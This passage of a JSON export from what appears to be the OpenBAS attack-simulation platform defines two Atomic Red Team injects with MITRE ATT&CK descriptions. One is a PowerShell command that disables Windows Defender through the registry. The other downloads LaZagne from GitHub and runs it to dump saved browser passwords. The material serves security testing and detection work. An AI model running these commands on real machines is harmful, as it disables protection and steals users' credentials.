          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "5a086a65-4729-429a-bb28-d8b13191fcd0",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "5a086a65-4729-429a-bb28-d8b13191fcd0",
      "injector_contract_labels" : {
        "en" : "Tamper with Windows Defender Registry",
        "fr" : "Tamper with Windows Defender Registry"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Tamper with Windows Defender Registry\",\"fr\":\"Tamper with Windows Defender Registry\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"5a086a65-4729-429a-bb28-d8b13191fcd0\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "27536fcd-e1e8-4351-8e9b-5a139637034b",
        "payload_type" : "Command",
        "payload_name" : "Tamper with Windows Defender Registry",
        "payload_description" : "Disable Windows Defender from starting after a reboot. Upen execution, if the computer is rebooted the entire Virus and Threat protection window in Settings will be\ngrayed out and have no info.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
          "attack_pattern_name" : "Disable or Modify Tools",
          "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
          "attack_pattern_external_id" : "T1562.001",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
            "phase_external_id" : "TA0005",
            "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
            "phase_name" : "Defense Evasion",
            "phase_shortname" : "defense-evasion",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "phase_order" : 6
          } ]
        } ],
        "payload_cleanup_executor" : "psh",
        "payload_cleanup_command" : "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 0\n",
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "1b3e0146-a1e5-4c5c-89fb-1bb2ffe8fc45",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:40.486119Z",
        "payload_updated_at" : "2025-07-03T14:45:26.654039Z",
        "command_executor" : "psh",
        "command_content" : "Set-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" -Name DisableAntiSpyware -Value 1\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:40.501201Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:40.501201Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "9ba3228e-bd66-43d1-b774-f37d3757efd8",
        "attack_pattern_name" : "Disable or Modify Tools",
        "attack_pattern_description" : "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware)\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021)\n\nAdversaries may also focus on specific applications such as Sysmon. For example, the “Start” and “Enable” values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369)\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk)\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",
        "attack_pattern_external_id" : "T1562.001",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
          "phase_external_id" : "TA0005",
          "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
          "phase_name" : "Defense Evasion",
          "phase_shortname" : "defense-evasion",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
          "phase_order" : 6
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "a3d751ea-fe72-41de-b0f0-f7eb1da18ab9",
    "inject_title" : "LaZagne - Credentials from Browser",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ],
      "lazagne_path" : "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe"
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 600,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "LaZagne - Credentials from Browser",
          "fr" : "LaZagne - Credentials from Browser"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        }, {
          "key" : "lazagne_path",
          "label" : "lazagne_path",
          "mandatory" : true,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "defaultValue" : "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe",
          "type" : "text"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "33b3d0be-2b9d-4f14-b910-0e61055c6d9f",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "33b3d0be-2b9d-4f14-b910-0e61055c6d9f",
      "injector_contract_labels" : {
        "en" : "LaZagne - Credentials from Browser",
        "fr" : "LaZagne - Credentials from Browser"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"LaZagne - Credentials from Browser\",\"fr\":\"LaZagne - Credentials from Browser\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"},{\"key\":\"lazagne_path\",\"label\":\"lazagne_path\",\"mandatory\":true,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"defaultValue\":\"PathToAtomicsFolder\\\\T1555.003\\\\bin\\\\LaZagne.exe\",\"type\":\"text\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"33b3d0be-2b9d-4f14-b910-0e61055c6d9f\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "7d79a51f-d523-4f40-b8da-011bcb0147e5",
        "payload_type" : "Command",
        "payload_name" : "LaZagne - Credentials from Browser",
        "payload_description" : "The following Atomic test utilizes [LaZagne](https://github.com/AlessandroZ/LaZagne) to extract passwords from browsers on the Windows operating system.\nLaZagne is an open source application used to retrieve passwords stored on a local computer. \n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "82181957-6de9-4549-bfda-f097745609b9",
          "attack_pattern_name" : "Credentials from Web Browsers",
          "attack_pattern_description" : "Adversaries may acquire credentials from web browsers by reading files specific to the target browser.(Citation: Talos Olympic Destroyer 2018) Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key.(Citation: Microsoft CryptUnprotectData April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc.(Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017) Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the [Windows Credential Manager](https://attack.mitre.org/techniques/T1555/004).\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 2016)\n\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).",
          "attack_pattern_external_id" : "T1555.003",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "447bbaf6-82da-4c43-90c8-713bd6117a85",
            "phase_external_id" : "TA0006",
            "phase_stix_id" : "x-mitre-tactic--2558fd61-8c75-4730-94c4-11926db2a263",
            "phase_name" : "Credential Access",
            "phase_shortname" : "credential-access",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to steal account names and passwords.\n\nCredential Access consists of techniques for stealing credentials like account names and passwords. Techniques used to get credentials include keylogging or credential dumping. Using legitimate credentials can give adversaries access to systems, make them harder to detect, and provide the opportunity to create more accounts to help achieve their goals.",
            "phase_order" : 7
          } ]
        } ],
        "payload_cleanup_executor" : null,
        "payload_cleanup_command" : null,
        "payload_elevation_required" : true,
        "payload_arguments" : [ {
          "type" : "text",
          "key" : "lazagne_path",
          "default_value" : "PathToAtomicsFolder\\T1555.003\\bin\\LaZagne.exe",
          "description" : null,
          "separator" : null
        } ],
        "payload_prerequisites" : [ {
          "executor" : "psh",
          "get_command" : "New-Item -Type Directory (split-path \"#{lazagne_path}\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\" -OutFile \"#{lazagne_path}\"\n",
          "check_command" : "if (Test-Path \"#{lazagne_path}\") {exit 0} else {exit 1}\n",
          "description" : "LaZagne.exe must exist on disk at specified location (#{lazagne_path})\n"
        } ],
        "payload_external_id" : "9a2915b3-3954-4cce-8c76-00fbf4dbd014",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:12:32.379207Z",
        "payload_updated_at" : "2025-07-03T14:49:37.631094Z",
        "command_executor" : "cmd",
        "command_content" : "\"#{lazagne_path}\" browsers\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:12:32.390601Z",
      "injector_contract_updated_at" : "2024-12-12T08:12:32.390601Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "82181957-6de9-4549-bfda-f097745609b9",
        "attack_pattern_name" : "Credentials from Web Browsers",
